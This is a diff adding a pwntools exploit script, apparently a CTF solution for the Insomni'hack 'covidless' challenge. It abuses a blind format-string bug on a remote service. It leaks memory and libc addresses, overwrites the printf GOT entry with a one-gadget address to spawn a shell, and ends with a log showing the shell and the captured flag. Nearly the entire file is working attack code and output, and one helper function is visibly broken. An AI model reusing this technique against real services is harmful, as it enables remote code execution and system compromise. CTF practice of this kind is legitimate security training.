@@ -1,0 +1,205 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template '--host=covidless.insomnihack.ch' '--port=6666'
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch='i386')
+exe = './path/to/binary'
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+host = args.HOST or 'covidless.insomnihack.ch'
+port = int(args.PORT or 6666)
+
+def local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+def remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return local(argv, *a, **kw)
+    else:
+        return remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+io = start()
+
+# shellcode = asm(shellcraft.sh())
+# payload = fit({
+#     32: 0xdeadbeef,
+#     'iaaa': [1, 2, 'Hello', 3]
+# }, length=128)
+# io.send(payload)
+# flag = io.recv(...)
+# log.success(flag)
+if args.LOOP:
+    for i in range(1,100):
+        io.sendline('AAAABBBB%{}$p'.format(i))
+        io.recvuntil('Your covid pass is invalid : AAAABBBB')
+        data = io.recvuntil('\ntry again ..\n', drop=True)
+        h = b''
+        if data.startswith(b'0x'):
+            d = data[2:]
+            if len(d) % 2 == 1:
+                d = b'0' + d
+            h = unhex(d)
+        print("i=%d h=%r data=%r" % (i, h, data))
+        if data != b'(nil)' and (len(h) == 3 or len(h) == 6):
+            io.sendline('%{}$s'.format(i))
+            io.recvuntil('Your covid pass is invalid : ')
+            data = io.recvuntil('\ntry again ..\n', drop=True)
+            print("STRING=%r" % data)
+
+def execfmt(payload):
+    io.sendline(payload)
+    io.recvuntil(b'Your covid pass is invalid : ')
+    return io.recvuntil(b'\ntry again ..\n', drop=True)
+
+autofmt = FmtStr(execfmt, offset=12)
+
+@pwnlib.memleak.MemLeak.NoNewlines
+def leak(address):
+    payload = b'%13$sAAA'
+    assert len(payload) == 8
+    payload += p64(address)
+    io.sendline(payload)
+    io.recvuntil(b'Your covid pass is invalid : ')
+    data = io.recvuntil(b'AAA', drop=True)
+    io.recvuntil(b'try again ..\n')
+    data += b'\x00'
+    addrstr = b'\x00'*8
+    if len(data) <= 8:
+        addrstr = data + b'\x00'*(8-len(data))
+
+    print('%#x => %r (%#x)' % (address, data, u64(addrstr)))
+    return data
+
+context.arch = 'amd64'
+context.word_size=64
+#acontext.log_level = 'DEBUG'
+addr = 0x60075a
+d = DynELF(leak, addr)
+
+#io.send(b'AA\nBB\nCC')
+
+# libc6_2.27-3ubuntu1_amd64.so
+
+
+#password = b'V4cC1n4t1on_1D_Pr1v_K3yS_c4nN0t_l34k'
+"""
+0x601008 => b'pq&\x97\xea\x7f\x00'          (0x7fea97267170)
+0x601018 => b'\xc0\xb9\xcc\x96\xea\x7f\x00' (0x7fea96ccb9c0) _IO_puts
+0x601020 => b'\xf6\x05@\x00'                (0x4005f6)
+0x601028 => b'\x80\xfe\xca\x96\xea\x7f\x00' (0x7fea96cafe80) _IO_printf
+0x601030 => b'P\x9f\xdd\x96\xea\x7f\x00'    (0x7fea96dd9f50) _snprintf
+0x601038 => b' \x9b\xcc\x96\xea\x7f\x00'    (0x7fea96cc9b20) fgets
+0x601040 => b'pN\xcf\x96\xea\x7f\x00'       (0x7fea96cf4e70) __snprintf_chk
+0x601048 => b'\xe0\x97\xcc\x96\xea\x7f\x00' (0x7fea96cc97e0)
+0x601050 => b'\x00'                         (0x0)
+0x601058 => b'\x00'                         (0x0)
+0x601060 => b'`w\x03\x97\xea\x7f\x00'       (0x7fea97037760)  _IO_2_1_stdin_
+"""
+
+# Libc found at
+# https://github.com/JustBeYou/ctfs/blob/master/asis19/libc6_2.27-3ubuntu1_amd64.so
+system_offset = 0x4f440
+puts_offset   = 0x809c0
+printf_offset = 0x64e80
+
+def write(addr, val):
+    payload = '%{}c'.format(c)
+    payload += '%15$hhn'
+    payload += b'\x00' * (16-len(payload))
+    payload += p64(write)
+
+    io.sendline(payload)
+    io.recvuntil(b'Your covid pass is invalid : ')
+    data = io.recvuntil(b'AAA', drop=True)
+    io.recvuntil(b'try again ..\n')
+    print('[write] %#x => %r' % (address, data))
+    return data
+
+def fill(data):
+    return data + b'\x00'*(8-len(data))
+
+libc_printf_ea = u64(fill(leak(0x601028)))
+print("libc printf = %#x" % libc_printf_ea)
+libc_base = libc_printf_ea - printf_offset
+
+gadgets = list(map(int, '324293 324386 939679 940120 940127 940131 1090444 1090456'.split(' ')))
+gadget = gadgets[int(args.X or 0)]
+#system_ea = libc_base + libc_base
+system_ea = libc_base + gadget
+
+print("libc base = %#x" % libc_base)
+print("system ea = %#x" % system_ea)
+
+#autofmt.write(0x601028, (system_ea >> 0) & 0xff)
+#autofmt.write(0x601029, (system_ea >> 8) & 0xff)
+#autofmt.write(0x60102a, (system_ea >> 16) & 0xff)
+s = fmtstr.fmtstr_payload(12, {0x601028: system_ea})
+assert len(s) <= 127
+io.sendline(s)
+
+io.interactive()
+
+"""
+while True:
+    x = input("<addr> [write: <val>]: ").split(' ')
+    if len(x) == 1:
+        addr = int(x[0], 16)
+        leak(addr)
+#    else:
+#        read, write = 
+
+"""
+
+"""
+(pwn) dc@ubuntu:~/insomnihackteaser/pwn_covidless$ python solv.py X=3
+[+] Opening connection to covidless.insomnihack.ch on port 6666: Done
+[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.
+0x600000 => b'\x7fELF\x02\x01\x01\x00' (0x10102464c457f)
+0x601028 => b'\x80\x8e\xea\x11q\x7f\x00' (0x7f7111ea8e80)
+libc printf = 0x7f7111ea8e80
+libc base = 0x7f7111e44000
+system ea = 0x7f7111f29858
+[*] Switching to interactive mode
+
+Your covid pass is invalid :                                                                                        4                        \x00            \x00                       \x80                                                                                         \xd0                              Vaaaaba(\x10try again ..
+
+$ ls
+$
+$ ls
+covidless
+flag
+libc6_2.27-3ubuntu1_amd64.so
+run.sh
+$ cat flag
+INS{F0rm4t_5tR1nGs_FuULly_Bl1nd_!Gj!}
+"""
